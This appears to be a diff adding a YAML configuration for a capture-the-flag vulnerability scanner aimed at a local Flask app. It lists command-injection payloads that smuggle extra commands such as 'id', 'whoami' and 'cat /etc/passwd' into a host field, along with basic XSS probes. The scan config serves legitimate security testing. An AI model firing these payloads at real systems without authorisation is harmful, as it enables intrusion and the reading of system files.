@@ -1,0 +1,41 @@
+#
+# ctf_scan.yaml  (..testing..) 
+#
+
+base_url: http://127.0.0.1:8080
+
+endpoints:
+  # Command injection test against /api/system/check
+  - name: system_check       # friendly label
+    type: injection          # use your InjectionScanner
+    method: POST
+    path: /api/internal/check
+    json_fields: [ host ]
+
+  # (Optional) test message content for XSS reflections
+  - name: messages_content
+    type: xss                # use HTTPScanner’s JSON-reflection logic
+    method: POST
+    path: /api/messages
+    json_fields: [ from, to, content ]
+    followup_get:
+      path: /api/messages/{to}
+      key: content
+
+scan_options:
+  timeout: 5
+  cors_test: true            # if your Flask app has CORS enabled
+
+# Define payloads per category
+payloads:
+  injection:
+    - "127.0.0.1; id"
+    - "127.0.0.1 && whoami"
+    - "127.0.0.1 | cat /etc/passwd"
+  xss:
+    - "<script>alert(1)</script>"
+    - '"><img src=x onerror=alert(1)>'
+
+report:
+  format: console
+  output_file: findings.json
